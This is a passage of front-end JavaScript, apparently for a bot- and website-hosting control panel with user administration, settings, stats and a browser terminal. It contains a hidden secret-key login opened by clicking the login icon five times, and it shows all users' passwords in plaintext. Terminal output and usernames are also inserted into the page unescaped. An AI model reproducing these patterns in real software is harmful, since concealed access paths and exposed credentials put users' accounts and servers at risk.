        const settingsCancelBtn = document.getElementById('settingsCancelBtn');
        const settingsSaveBtn = document.getElementById('settingsSaveBtn');
        const settingsWebsiteName = document.getElementById('settingsWebsiteName');
        const settingsTelegram = document.getElementById('settingsTelegram');
        const settingsYoutube = document.getElementById('settingsYoutube');
        const settingsInstagram = document.getElementById('settingsInstagram');
        const settingsTiktok = document.getElementById('settingsTiktok');
        const settingsLogoInput = document.getElementById('settingsLogoInput');
        const settingsLogoPreview = document.getElementById('settingsLogoPreview');
        const settingsRemoveLogoBtn = document.getElementById('settingsRemoveLogoBtn');

        let currentUser = null;
        let selectedBotId = null;
        let selectedWebsiteId = null;
        let websiteLogInterval = null;
        let botLogInterval = null;
        let uptimeIntervals = {};
        let terminalPollInterval = null;
        let isTerminalRunning = false;

        // ----- LOGIN -----
        async function handleLogin() {
            const username = loginUsername.value.trim();
            const password = loginPassword.value.trim();
            const role = loginRoleSelect.value;
            loginError.textContent = '';
            if (!username || !password) {
                loginError.textContent = 'Please enter username and password.';
                return;
            }
            try {
                const data = await apiCall('/login', {
                    method: 'POST',
                    body: JSON.stringify({ username, password, role })
                });
                if (data.success) {
                    currentUser = { username: data.username, role: data.role };
                    document.querySelector('.login-card').classList.add('login-success');
                    setTimeout(() => { location.reload(); }, 500);
                }
            } catch(e) {
                document.querySelector('.login-card').classList.add('shake');
                setTimeout(() => { document.querySelector('.login-card').classList.remove('shake'); }, 500);
                loginError.textContent = e.message || 'Login failed';
            }
        }

        async function handleLogout() {
            const confirmed = await customConfirm('Logout?', '👋');
            if (!confirmed) return;
            try { await apiCall('/logout', { method: 'POST' }); } catch(_) {}
            location.reload();
        }

        // ----- SECRET LOGIN -----
        let loginIconClickCount = 0;
        let loginIconTimer = null;
        document.getElementById('loginIcon').addEventListener('click', function() {
            loginIconClickCount++;
            clearTimeout(loginIconTimer);
            loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);
            if (loginIconClickCount >= 5) {
                loginIconClickCount = 0;
                showSecretKeyModal();
            }
        });

        async function showSecretKeyModal() {
            const bodyHTML = `<div style="text-align:center;"><p style="margin-bottom:12px;">Enter Secret Key:</p><input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>`;
            const result = await showCustomModal('🔑', bodyHTML, [
                { label: 'Cancel', value: false, className: 'btn-cancel' },
                { label: 'Login', value: true, className: 'btn-confirm' }
            ]);
            if (result) {
                const secret = document.getElementById('secretKeyInput')?.value;
                if (!secret) { await customAlert('Enter secret key.', '⚠️'); return; }
                try {
                    const res = await apiCall('/api/secret_login', { method: 'POST', body: JSON.stringify({ secret }) });
                    if (res.success) location.reload();
                    else await customAlert(res.error || 'Invalid secret', '❌');
                } catch(e) { await customAlert('Error: ' + e.message, '❌'); }
            }
        }

        // ----- TABS -----
        const tabBtns = document.querySelectorAll('.tabs .tab-btn');
        tabBtns.forEach(btn => {
            btn.addEventListener('click', function() {
                tabBtns.forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                const tabId = this.dataset.tab;
                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                document.getElementById('tab-' + tabId).classList.add('active');
                if (tabId === 'websites') loadWebsites();
                else if (tabId === 'bots') loadBots();
                sessionStorage.setItem('activeTab', tabId);
            });
        });
        const savedTab = sessionStorage.getItem('activeTab') || 'bots';
        const savedTabBtn = document.querySelector(`.tabs .tab-btn[data-tab="${savedTab}"]`);
        if (savedTabBtn) savedTabBtn.click();

        // ----- WEBSITES -----
        async function loadWebsites() {
            try {
                const res = await fetch('/api/websites');
                const data = await res.json();
                renderWebsites(data);
            } catch(e) {
                websiteGrid.innerHTML = `<div class="empty-msg">Error loading websites</div>`;
            }
        }

        function renderWebsites(websites) {
            if (!websites || websites.length === 0) {
                websiteGrid.innerHTML = `<div class="empty-msg">No websites deployed.</div>`;
                return;
            }
            let html = '';
            websites.forEach(w => {
                const statusClass = w.status === 'running' ? 'running' : 'stopped';
                const uptimeDisplay = w.status === 'running' && w.last_start_time ?
                    formatUptime((Date.now()/1000) - new Date(w.last_start_time).getTime()/1000) : '--';
                const selected = (w.id === selectedWebsiteId) ? 'selected' : '';
                const startupFile = w.startup_file || 'app.py';
                const visitButton = w.status === 'running' ?
                    `<div class="visit-btn-container"><a href="/${w.website_slug}/" target="_blank" class="btn-visit-w">🌐 Visit Website</a></div>` :
                    '<div class="visit-btn-container"></div>';
                html += `
                    <div class="website-card ${selected}" data-id="${w.id}">
                        <div class="website-header"><span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span><span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span></div>
                        <div class="website-startup-file">📄 ${escapeHtml(startupFile)}</div>
                        ${visitButton}
                        <div class="website-slug">🔗 ${escapeHtml(w.website_slug)}</div>
                        <div class="website-port">Port: ${w.allocated_port || 'N/A'}</div>
                        <div class="bot-uptime" id="w-uptime-${w.id}">UPTIME: ${uptimeDisplay}</div>
                        <div class="website-actions">
                            <button class="btn-start-w" data-action="start-w" data-id="${w.id}">▶ START</button>
                            <button class="btn-stop-w" data-action="stop-w" data-id="${w.id}">⏹ STOP</button>
                            <button class="btn-restart-w" data-action="restart-w" data-id="${w.id}">⟳ RESTART</button>
                            <button class="btn-delete-w" data-action="delete-w" data-id="${w.id}">🗑 DELETE</button>
                            <button class="btn-edit-w" data-action="edit-w" data-id="${w.id}">✎ EDIT</button>
                            <button class="btn-download-w" data-action="download-w" data-id="${w.id}">⬇ DOWNLOAD</button>
                            <button class="btn-files-w" data-action="files-w" data-id="${w.id}">📁 FILES</button>
                            <button class="btn-buildlogs-w" data-action="buildlogs-w" data-id="${w.id}">🖥 BUILD LOGS</button>
                        </div>
                        <div class="name-edit">
                            <input type="text" placeholder="Rename" id="w-name-input-${w.id}" value="${escapeHtml(w.website_name || '')}" />
                            <button onclick="renameWebsite(${w.id})">Rename</button>
                        </div>
                    </div>
                `;
            });
            websiteGrid.innerHTML = html;

            document.querySelectorAll('.website-card [data-action]').forEach(btn => {
                btn.addEventListener('click', async function(e) {
                    e.stopPropagation();
                    const action = this.dataset.action;
                    const id = parseInt(this.dataset.id);
                    if (action === 'start-w') await websiteAction(id, 'start');
                    else if (action === 'stop-w') await websiteAction(id, 'stop');
                    else if (action === 'restart-w') await websiteAction(id, 'restart');
                    else if (action === 'delete-w') {
                        if (await customConfirm('Delete this website?', '🗑️')) await websiteAction(id, 'delete');
                    } else if (action === 'edit-w') await editWebsite(id);
                    else if (action === 'download-w') window.open(`/api/website/${id}/download`, '_blank');
                    else if (action === 'files-w') window.open(`/website/${id}/files`, '_blank');
                    else if (action === 'buildlogs-w') window.open(`/website/${id}/build`, '_blank');
                });
            });

            document.querySelectorAll('.website-card').forEach(card => {
                card.addEventListener('click', function(e) {
                    if (e.target.closest('button') || e.target.closest('.name-edit')) return;
                    selectWebsite(parseInt(this.dataset.id));
                });
            });

            websites.forEach(w => {
                if (w.status === 'running' && w.last_start_time) {
                    startUptimeUpdate('w-uptime-' + w.id, new Date(w.last_start_time).getTime()/1000);
                }
            });
            if (!selectedWebsiteId && websites.length > 0) selectWebsite(websites[0].id);
        }

        async function websiteAction(id, action) {
            try {
                const res = await apiCall(`/api/website/${id}/${action}`, { method: 'POST' });
                if (res.success) { await loadWebsites(); setTimeout(() => loadWebsites(), 1000); }
                else await customAlert(res.error || 'Action failed', '❌');
            } catch(e) { await customAlert(e.message, '❌'); }
        }

        async function editWebsite(id) {
            try {
                const data = await apiCall(`/api/website/${id}/content`);
                const content = data.content || '';
                const filename = data.filename || 'app.py';
                const bodyHTML = `
                    <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
                        <span style="color:#888;font-family:monospace;font-size:0.8rem;">📄 ${filename}</span>
                        <button class="btn-sm" id="copyAllBtnW">📋 Copy All</button>
                    </div>
                    <textarea id="editFileContentW" rows="15">${escapeHtml(content)}</textarea>
                `;
                const result = await showCustomModal('✎ Edit File', bodyHTML, [
                    { label: 'Cancel', value: false, className: 'btn-cancel' },
                    { label: '💾 SAVE', value: true, className: 'btn-confirm' }
                ]);
                if (result) {
                    const newContent = document.getElementById('editFileContentW').value;
                    await apiCall(`/api/website/${id}/content`, { method: 'PUT', body: JSON.stringify({ content: newContent }) });
                    await customAlert('File saved.', '✅');
                    await loadWebsites();
                }
                setTimeout(() => {
                    const copyBtn = document.getElementById('copyAllBtnW');
                    if (copyBtn) copyBtn.onclick = function() {
                        const ta = document.getElementById('editFileContentW');
                        ta.select();
                        navigator.clipboard?.writeText(ta.value)?.then(() => customAlert('📋 Copied!', '✅'));
                    };
                }, 100);
            } catch(e) { await customAlert(e.message, '❌'); }
        }

        function selectWebsite(id) {
            selectedWebsiteId = id;
            document.querySelectorAll('.website-card').forEach(c => c.classList.remove('selected'));
            const card = document.querySelector(`.website-card[data-id="${id}"]`);
            if (card) card.classList.add('selected');
            loadWebsiteLogs(id);
            if (websiteLogInterval) clearInterval(websiteLogInterval);
            websiteLogInterval = setInterval(() => loadWebsiteLogs(id, true), 3000);
        }

        async function loadWebsiteLogs(id, silent = false) {
            try {
                const data = await apiCall(`/api/website/${id}/logs`);
                websiteConsole.textContent = data.logs || 'No logs yet.';
            } catch(e) { if (!silent) websiteConsole.textContent = 'Error loading logs.'; }
        }

        window.renameWebsite = async function(id) {
            const input = document.getElementById('w-name-input-' + id);
            const newName = input.value.trim();
            if (!newName) return;
            try {
                const formData = new FormData();
                formData.append('name', newName);
                const res = await fetch(`/api/website/${id}/rename`, { method: 'POST', body: formData });
                const data = await res.json();
                if (data.success) await loadWebsites();
                else await customAlert(data.error || 'Rename failed', '❌');
            } catch(e) { await customAlert(e.message, '❌'); }
        };

        // ----- WEBSITE UPLOAD -----
        uploadCardWebsite.addEventListener('click', function(e) {
            if (e.target.closest('.deploy-btn')) return;
            fileInputWebsite.click();
        });

        deployBtnWebsite.addEventListener('click', async function() {
            if (fileInputWebsite.files.length === 0) {
                await customAlert('Please select at least one file first.', '⚠️');
                return;
            }
            const formData = new FormData();
            for (let i = 0; i < fileInputWebsite.files.length; i++) formData.append('files[]', fileInputWebsite.files[i]);
            try {
                deployBtnWebsite.textContent = 'UPLOADING...';
                deployBtnWebsite.disabled = true;
                const res = await fetch('/upload_website', { method: 'POST', body: formData });
                const data = await res.json();
                if (data.success) {
                    await customAlert(`Website deployed! ID: ${data.website_id}`, '✅');
                    await loadWebsites();
                    fileInputWebsite.value = '';
                    fileCountDisplayWebsite.textContent = '';
                } else await customAlert(data.error || 'Upload failed', '❌');
            } catch(e) { /* handled */ }
            finally { deployBtnWebsite.textContent = 'DEPLOY WEBSITE'; deployBtnWebsite.disabled = false; }
        });

        fileInputWebsite.addEventListener('change', function() {
            const count = this.files.length;
            fileCountDisplayWebsite.textContent = count ? `${count} file(s) selected` : '';
        });

        // ----- BOTS -----
        async function loadBots() {
            try {
                const bots = await apiCall('/api/bots');
                renderBots(bots);
            } catch(e) {
                botListContainer.innerHTML = `<div class="empty-msg">Error loading bots</div>`;
            }
        }

        function renderBots(bots) {
            if (!bots || bots.length === 0) {
                botListContainer.innerHTML = `<div class="empty-msg">No bots deployed.</div>`;
                return;
            }
            let html = '';
            bots.forEach(bot => {
                const statusClass = bot.status === 'running' ? 'running' : 'stopped';
                const uptimeDisplay = bot.status === 'running' && bot.start_time ?
                    formatUptime(Date.now()/1000 - bot.start_time) : '--';
                const selected = (bot.id === selectedBotId) ? 'selected' : '';
                const hasToken = bot.has_token || false;
                const botUsername = bot.bot_username || null;
                html += `
                    <div class="bot-card ${selected}" data-id="${bot.id}">
                        <div class="bot-header"><span class="bot-name">${escapeHtml(bot.filename)}</span><span class="bot-status ${statusClass}">● ${bot.status.toUpperCase()}</span></div>
                        <div class="bot-owner">👤 ${escapeHtml(bot.user)}</div>
                        <div class="bot-uptime" id="uptime-${bot.id}">UPTIME: ${uptimeDisplay}</div>
                        <div class="bot-controls">
                            <button class="btn-start" data-action="start">${bot.status === 'running' ? '▶ RUNNING' : '▶ START'}</button>
                            <button class="btn-stop" data-action="stop">⏹ STOP</button>
                            <button class="btn-edit" data-action="edit">✎ EDIT</button>
                            <button class="btn-restart" data-action="restart">⟳ RESTART</button>
                            <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
                            <button class="btn-delete" data-action="delete">🗑 DELETE</button>
                            ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
                        </div>
                    </div>
                `;
            });
            botListContainer.innerHTML = html;

            document.querySelectorAll('.bot-card').forEach(card => {
                card.addEventListener('click', function(e) {
                    if (e.target.closest('button')) return;
                    selectBot(this.dataset.id);
                });
            });

            document.querySelectorAll('.bot-card [data-action]').forEach(btn => {
                btn.addEventListener('click', async function(e) {
                    e.stopPropagation();
                    const action = this.dataset.action;
                    const card = this.closest('.bot-card');
                    const botId = card.dataset.id;
                    const originalText = this.textContent;
                    this.disabled = true;
                    try {
                        if (action === 'openbot') {
                            const botUsername = this.dataset.bot;
                            if (botUsername) {
                                window.open(`https://t.me/${botUsername}`, '_blank');
                                await customAlert(`🤖 Opening @${botUsername}`, '✅');
                            }
                            this.disabled = false; this.textContent = originalText; return;
                        }
                        if (action === 'edit') {
                            await openEditModal(botId);
                            this.disabled = false; this.textContent = originalText; return;
                        }
                        if (action === 'download') {
                            window.open(`/api/bots/${botId}/download`, '_blank');
                            this.disabled = false; this.textContent = originalText; return;
                        }
                        await handleBotAction(botId, action);
                    } catch(e) {}
                    finally {
                        if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
                            this.disabled = false;
                            this.textContent = originalText;
                        }
                    }
                });
            });

            bots.forEach(bot => {
                if (bot.status === 'running' && bot.start_time) {
                    startUptimeUpdate('uptime-' + bot.id, bot.start_time);
                }
            });
            if (!selectedBotId && bots.length > 0) selectBot(bots[0].id);
        }

        function startUptimeUpdate(elId, startTime) {
            if (uptimeIntervals[elId]) clearInterval(uptimeIntervals[elId]);
            const el = document.getElementById(elId);
            if (!el) return;
            uptimeIntervals[elId] = setInterval(() => {
                const diff = Date.now()/1000 - startTime;
                el.textContent = 'UPTIME: ' + formatUptime(diff);
            }, 1000);
        }

        function selectBot(botId) {
            selectedBotId = botId;
            document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('selected'));
            const card = document.querySelector(`.bot-card[data-id="${botId}"]`);
            if (card) card.classList.add('selected');
            loadBotLogs(botId);
            if (botLogInterval) clearInterval(botLogInterval);
            botLogInterval = setInterval(() => loadBotLogs(botId, true), 3000);
        }

        async function loadBotLogs(botId, silent = false) {
            try {
                const data = await apiCall(`/api/bots/${botId}/logs`);
                botConsole.textContent = data.logs || 'No logs yet.';
            } catch(e) { if (!silent) botConsole.textContent = 'Error loading logs.'; }
        }

        async function handleBotAction(botId, action) {
            try {
                if (action === 'start') await apiCall(`/api/bots/${botId}/start`, { method: 'POST' });
                else if (action === 'stop') await apiCall(`/api/bots/${botId}/stop`, { method: 'POST' });
                else if (action === 'restart') await apiCall(`/api/bots/${botId}/restart`, { method: 'POST' });
                else if (action === 'delete') {
                    if (!await customConfirm('Delete this bot?', '🗑️')) return;
                    await apiCall(`/api/bots/${botId}`, { method: 'DELETE' });
                    if (selectedBotId === botId) { selectedBotId = null; if (botLogInterval) clearInterval(botLogInterval); botConsole.textContent = 'Bot deleted.'; }
                } else return;
                await loadBots();
            } catch(e) { await customAlert(e.message || 'Action failed', '❌'); }
        }

        async function openEditModal(botId) {
            try {
                const data = await apiCall(`/api/bots/${botId}/content`);
                const content = data.content || '';
                const bodyHTML = `
                    <div style="margin-bottom:8px;"><button class="btn-sm" id="copyAllBtn">📋 Copy All</button></div>
                    <textarea id="editFileContent" rows="15">${escapeHtml(content)}</textarea>
                `;
                const result = await showCustomModal('✎ Edit File', bodyHTML, [
                    { label: 'Cancel', value: false, className: 'btn-cancel' },
                    { label: '💾 SAVE', value: true, className: 'btn-confirm' }
                ]);
                if (result) {
                    const newContent = document.getElementById('editFileContent').value;
                    await apiCall(`/api/bots/${botId}/content`, { method: 'PUT', body: JSON.stringify({ content: newContent }) });
                    await customAlert('File saved.', '✅');
                    await loadBots();
                }
                setTimeout(() => {
                    const copyBtn = document.getElementById('copyAllBtn');
                    if (copyBtn) copyBtn.onclick = function() {
                        const ta = document.getElementById('editFileContent');
                        ta.select();
                        navigator.clipboard?.writeText(ta.value)?.then(() => customAlert('📋 Copied!', '✅'));
                    };
                }, 100);
            } catch(e) { await customAlert(e.message, '❌'); }
        }

        // ----- BOT UPLOAD -----
        uploadCardBot.addEventListener('click', function(e) {
            if (e.target.closest('.deploy-btn')) return;
            fileInputBot.click();
        });

        deployBtnBot.addEventListener('click', async function() {
            if (fileInputBot.files.length === 0) {
                await customAlert('Please select at least one file first.', '⚠️');
                return;
            }
            const formData = new FormData();
            for (let i = 0; i < fileInputBot.files.length; i++) formData.append('files[]', fileInputBot.files[i]);
            try {
                deployBtnBot.textContent = 'UPLOADING...';
                deployBtnBot.disabled = true;
                const res = await fetch('/upload', { method: 'POST', body: formData });
                const data = await res.json();
                if (data.success) {
                    await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
                    await loadBots();
                    fileInputBot.value = '';
                    fileCountDisplayBot.textContent = '';
                } else await customAlert(data.error || 'Upload failed', '❌');
            } catch(e) {}
            finally { deployBtnBot.textContent = 'DEPLOY BOT'; deployBtnBot.disabled = false; }
        });

        fileInputBot.addEventListener('change', function() {
            const count = this.files.length;
            fileCountDisplayBot.textContent = count ? `${count} file(s) selected` : '';
        });

        // ----- ADMIN PANEL -----
        function openAdminPanel() { loadAdminUsers(); adminOverlay.classList.add('open'); }
        function closeAdminPanel() { adminOverlay.classList.remove('open'); }

        // ----- USER MANAGEMENT -----
        async function loadAdminUsers() {
            try {
                const users = await apiCall('/api/users');
                renderFullUserList(users);
                renderSimpleLists(users);
            } catch(e) { console.error('Failed to load users:', e); }
        }

        function renderFullUserList(users) {
            if (!users || users.length === 0) {
                fullUserListContainer.innerHTML = `<div class="empty-msg">No users found.</div>`;
                return;
            }
            let html = '';
            users.forEach((u) => {
                const bannedClass = u.banned ? 'banned' : (u.role === 'admin' ? 'admin' : 'user');
                const bannedText = u.banned ? 'UNBAN' : 'BAN';
                let expiryDisplay = 'Never';
                if (u.expires_at) { try { expiryDisplay = new Date(u.expires_at).toLocaleString(); } catch(e) {} }
                html += `
                    <div class="list-item" data-username="${u.username}">
                        <div class="row"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span><span style="font-size:12px;color:#888;">Expires: ${expiryDisplay}</span></div><span class="badge-role ${bannedClass}">${u.banned ? 'BANNED' : u.role.toUpperCase()}</span></div>
                        <div class="row"><div class="limit-group"><label>Limit:</label><input type="number" class="limit-input" value="${u.limit || 0}" min="0" step="1" /></div><button class="btn-action btn-set" data-action="setLimit" data-username="${u.username}">SET</button><button class="btn-action btn-ban" data-action="toggleBan" data-username="${u.username}">${bannedText}</button></div>
                        <div class="row"><input type="text" placeholder="New password..." style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newPass" /><button class="btn-action btn-reset" data-action="resetPass" data-username="${u.username}">RESET PW</button></div>
                        <div class="row"><input type="text" placeholder="New expiry (e.g. 5, 1m, 2h)" style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newExpiry" /><button class="btn-action btn-set" data-action="setExpiry" data-username="${u.username}">SET EXPIRY</button></div>
                        <button class="btn-action btn-del" data-action="deleteUser" data-username="${u.username}">DELETE USER</button>
                    </div>
                `;
            });
            fullUserListContainer.innerHTML = html;
            attachFullListEvents();
        }

        function attachFullListEvents() {
            document.querySelectorAll('#fullUserListContainer [data-action]').forEach(btn => {
                btn.addEventListener('click', async function(e) {
                    e.stopPropagation();
                    const action = this.dataset.action;
                    const username = this.dataset.username;
                    const card = this.closest('.list-item');
                    if (action === 'setLimit') {
                        const val = parseInt(card.querySelector('.limit-input').value, 10);
                        if (isNaN(val) || val < 0) { await customAlert('Enter valid number.', '⚠️'); return; }
                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ limit: val }) }); await loadAdminUsers(); }
                        catch(e) { await customAlert(e.message, '❌'); }
                    } else if (action === 'toggleBan') {
                        const user = (await apiCall('/api/users')).find(u => u.username === username);
                        if (!user) return;
                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ banned: !user.banned }) }); await loadAdminUsers(); }
                        catch(e) { await customAlert(e.message, '❌'); }
                    } else if (action === 'resetPass') {
                        const newPass = card.querySelector('[data-field="newPass"]').value.trim();
                        if (!newPass) { await customAlert('Enter new password.', '⚠️'); return; }
                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ password: newPass }) }); card.querySelector('[data-field="newPass"]').value = ''; await customAlert('Password updated.', '✅'); await loadAdminUsers(); }
                        catch(e) { await customAlert(e.message, '❌'); }
                    } else if (action === 'setExpiry') {
                        const expiry = card.querySelector('[data-field="newExpiry"]').value.trim();
                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ expiry: expiry }) }); card.querySelector('[data-field="newExpiry"]').value = ''; await customAlert('Expiry updated.', '✅'); await loadAdminUsers(); }
                        catch(e) { await customAlert(e.message, '❌'); }
                    } else if (action === 'deleteUser') {
                        if (!await customConfirm(`Delete user ${username}?`, '🗑️')) return;
                        try { await apiCall(`/api/users/${username}`, { method: 'DELETE' }); await loadAdminUsers(); }
                        catch(e) { await customAlert(e.message, '❌'); }
                    }
                });
            });
        }

        function renderSimpleLists(users) {
            const admins = users.filter(u => u.role === 'admin' && !u.banned);
            const regulars = users.filter(u => u.role === 'user' && !u.banned);

            simpleAdminListContainer.innerHTML = admins.length ? admins.map(u => `
                <div class="simple-list-item"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span></div><div class="actions"><button class="btn-remove-simple" data-username="${u.username}">REMOVE</button></div></div>
            `).join('') : '<div class="empty-msg">No admins.</div>';

            simpleUserListContainer.innerHTML = regulars.length ? regulars.map(u => `
                <div class="simple-list-item"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span></div><div class="actions"><button class="btn-remove-simple" data-username="${u.username}">REMOVE</button></div></div>
            `).join('') : '<div class="empty-msg">No users.</div>';

            document.querySelectorAll('.btn-remove-simple').forEach(btn => {
                btn.addEventListener('click', async function(e) {
                    e.stopPropagation();
                    const username = this.dataset.username;
                    if (!await customConfirm(`Remove user ${username}?`, '🗑️')) return;
                    try { await apiCall(`/api/users/${username}`, { method: 'DELETE' }); await loadAdminUsers(); }
                    catch(e) { await customAlert(e.message, '❌'); }
                });
            });
        }

        // ----- CREATE USER -----
        toggleCreateUserBtn.addEventListener('click', function() {
            createUserForm.style.display = createUserForm.style.display === 'none' ? 'block' : 'none';
        });

        createUserBtn.addEventListener('click', async function() {
            const username = newUsername.value.trim();
            const password = newPassword.value.trim();
            const expiry = newExpiry.value.trim();
            const role = newRole.value;
            if (!username || !password) { await customAlert('Username and Password required.', '⚠️'); return; }
            try {
                await apiCall('/api/users', { method: 'POST', body: JSON.stringify({ username, password, role, expiry }) });
                await loadAdminUsers();
                newUsername.value = ''; newPassword.value = ''; newExpiry.value = '';
                createUserForm.style.display = 'none';
                await customAlert(`User ${username} created.`, '✅');
            } catch(e) { await customAlert(e.message || 'Creation failed', '❌'); }
        });

        // ----- PROFILE EDIT -----
        document.getElementById('editProfileBtn').addEventListener('click', async function() {
            const currentUsername = document.querySelector('.user-title').textContent;
            const bodyHTML = `
                <div style="text-align:center;">
                    <div style="font-size:20px; margin-bottom:20px;">✎ Edit Profile</div>
                    <div style="margin-bottom:12px;"><label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Username</label><input type="text" id="editUsername" value="${currentUsername}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>
                    <div><label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Password</label><input type="password" id="editPassword" placeholder="New password..." style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>
                </div>
            `;
            const result = await showCustomModal('✎', bodyHTML, [
                { label: 'Cancel', value: false, className: 'btn-cancel' },
                { label: 'Save', value: true, className: 'btn-confirm' }
            ]);
            if (result) {
                const newUsername = document.getElementById('editUsername').value.trim();
                const newPassword = document.getElementById('editPassword').value.trim();
                try {
                    const res = await apiCall('/api/profile', { method: 'PUT', body: JSON.stringify({ username: newUsername, password: newPassword }) });
                    if (res.success) {
                        if (res.logout) { await customAlert('Profile updated! Logging out.', '✅'); window.location.href = '/'; }
                        else { await customAlert('Profile updated!', '✅'); location.reload(); }
                    }
                } catch(e) { await customAlert(e.message, '❌'); }
            }
        });

        // ----- SETTINGS -----
        settingsBtn.addEventListener('click', function() { loadSettings(); settingsModalOverlay.classList.add('open'); });
        settingsCancelBtn.addEventListener('click', function() { settingsModalOverlay.classList.remove('open'); });
        settingsModalOverlay.addEventListener('click', function(e) { if (e.target === this) settingsModalOverlay.classList.remove('open'); });

        async function loadSettings() {
            try {
                const res = await fetch('/api/settings');
                const data = await res.json();
                settingsWebsiteName.value = data.website_name || 'YUVICODEX';
                settingsTelegram.value = data.social_links?.telegram || '#';
                settingsYoutube.value = data.social_links?.youtube || '#';
                settingsInstagram.value = data.social_links?.instagram || '#';
                settingsTiktok.value = data.social_links?.tiktok || '#';
                settingsLogoPreview.innerHTML = data.logo ? `<img src="${data.logo}" class="logo-preview" />` : '';
            } catch(e) { console.error('Failed to load settings', e); }
        }

        settingsSaveBtn.addEventListener('click', async function() {
            const payload = {
                website_name: settingsWebsiteName.value.trim() || 'YUVICODEX',
                social_links: {
                    telegram: settingsTelegram.value.trim() || '#',
                    youtube: settingsYoutube.value.trim() || '#',
                    instagram: settingsInstagram.value.trim() || '#',
                    tiktok: settingsTiktok.value.trim() || '#'
                }
            };
            try {
                const res = await apiCall('/api/settings', { method: 'POST', body: JSON.stringify(payload) });
                if (res.success) { await customAlert('Settings saved!', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
            } catch(e) { await customAlert(e.message, '❌'); }
        });

        settingsRemoveLogoBtn.addEventListener('click', async function() {
            if (!await customConfirm('Remove logo?', '🗑️')) return;
            try { await fetch('/api/settings/logo', { method: 'DELETE' }); await customAlert('Logo removed.', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
            catch(e) { await customAlert(e.message, '❌'); }
        });

        settingsLogoInput.addEventListener('change', async function() {
            if (this.files.length > 0) {
                const formData = new FormData();
                formData.append('logo', this.files[0]);
                try { await fetch('/api/settings/logo', { method: 'POST', body: formData }); await customAlert('Logo uploaded!', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
                catch(e) { await customAlert(e.message, '❌'); }
                this.value = '';
            }
        });

        // ----- TERMINAL -----
        async function startTerminalPolling() {
            if (terminalPollInterval) clearInterval(terminalPollInterval);
            try { await fetch('/api/terminal/start', { method: 'POST' }); } catch(e) {}
            terminalPollInterval = setInterval(async () => {
                try {
                    const res = await fetch('/api/terminal/read');
                    const data = await res.json();
                    if (data.output) { terminalOutput.innerHTML += data.output; terminalOutput.scrollTop = terminalOutput.scrollHeight; }
                    isTerminalRunning = data.running;
                    termStopBtn.disabled = !isTerminalRunning;
                } catch(e) {}
            }, 500);
        }

        termRunBtn.addEventListener('click', function() {
            const data = terminalCommand.value;
            if (!data) return;
            fetch('/api/terminal/send', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: data }) });
            terminalCommand.value = '';
        });

        termStopBtn.addEventListener('click', function() {
            fetch('/api/terminal/stop', { method: 'POST' });
            isTerminalRunning = false;
            termStopBtn.disabled = true;
        });

        termClearBtn.addEventListener('click', function() { terminalOutput.innerHTML = ''; });
        terminalCommand.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); termRunBtn.click(); } });

        // ----- STATS -----
        async function fetchStats() {
            try {
                const res = await fetch('/api/stats');
                if (!res.ok) return;
                const data = await res.json();
                document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
                document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
                document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
                document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
                document.getElementById('statRenderActive').textContent = data.render_active_count;
                document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
                document.getElementById('statDiskFree').textContent = data.disk_free_gb || data.container_storage_free_gb || 0;
                document.getElementById('statRam').textContent = data.ram.percent + '%';
                document.getElementById('statRamUsed').textContent = data.ram.used_mb;
                document.getElementById('statRamTotal').textContent = data.ram.total_mb;
                document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
                document.getElementById('statCpu').textContent = data.cpu_percent + '%';
            } catch(e) { console.error('Stats error:', e); }
        }

        document.getElementById('setOffsetBtn').addEventListener('click', async function() {
            const val = parseFloat(document.getElementById('offsetInput').value);
            if (isNaN(val)) { await customAlert('Enter valid number', '⚠️'); return; }
            try {
                const res = await apiCall('/api/set_offset', { method: 'POST', body: JSON.stringify({ offset: val }) });
                if (res.success) { await customAlert('Offset set to ' + val + ' hrs', '✅'); fetchStats(); }
            } catch(e) { await customAlert(e.message, '❌'); }
        });

        // ----- ADMIN TAB SWITCHING -----
        const adminTabBtns = document.querySelectorAll('.admin-tabs button');
